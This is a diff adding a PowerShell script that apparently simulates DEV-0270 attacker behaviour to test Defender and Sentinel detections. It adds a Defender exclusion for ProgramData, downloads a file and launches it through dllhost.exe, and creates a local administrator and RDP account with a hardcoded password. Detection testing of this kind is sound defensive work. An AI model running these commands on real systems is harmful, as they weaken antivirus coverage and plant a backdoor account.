@@ -1,0 +1,52 @@
+#Created for testing of Issue #356: Dev-0270 Malicious Powershell usage
+Write-Host "Starting DEV-0270 PowerShell Simulation..." -ForegroundColor Cyan
+
+# **Fix TLS Issues Before Invoke-WebRequest**
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# **Pattern 1: Add Defender Exclusion**
+Write-Host "[+] Attempting to add Microsoft Defender exclusion for ProgramData..."
+try {
+    Add-MpPreference -ExclusionPath "C:\ProgramData"
+} catch {
+    Write-Host "[-] Failed to add exclusion" -ForegroundColor Yellow
+}
+Start-Sleep -Seconds 2
+
+# **Pattern 2: Simulating Malicious File Download**
+Write-Host "[+] Simulating malicious file download..."
+$file = "$env:ProgramData\example-malware.exe"
+try {
+    Invoke-WebRequest -Uri "https://speed.hetzner.de/100MB.bin" -OutFile $file
+    Start-Process -FilePath "dllhost.exe" -ArgumentList "/c $file"
+} catch {
+    Write-Host "[-] File download failed. Possible TLS issue." -ForegroundColor Yellow
+}
+Start-Sleep -Seconds 2
+
+# **Pattern 3: Creating and Adding User to Groups**
+$user = "TestUser"
+$adminsGroup = "Administrators"
+$rdpGroup = "Remote Desktop Users"
+
+# Check if user exists, remove if necessary
+if (Get-LocalUser -Name $user -ErrorAction SilentlyContinue) {
+    Write-Host "[-] TestUser already exists. Removing..."
+    Remove-LocalUser -Name $user
+}
+
+Write-Host "[+] Creating test user..."
+New-LocalUser -Name $user -Password (ConvertTo-SecureString "P@ssword123" -AsPlainText -Force) -FullName "Test User" -Description "Test Account"
+
+Write-Host "[+] Adding user to Administrators group..."
+Add-LocalGroupMember -Group $adminsGroup -Member $user
+
+Write-Host "[+] Adding user to RDP Users group..."
+Add-LocalGroupMember -Group $rdpGroup -Member $user
+
+Write-Host "Simulation Complete! Check Defender & Sentinel." -ForegroundColor Green
+
+# **Cleanup**
+Write-Host "[+] Cleaning up..."
+Remove-LocalUser -Name $user
+Write-Host "Cleanup complete."
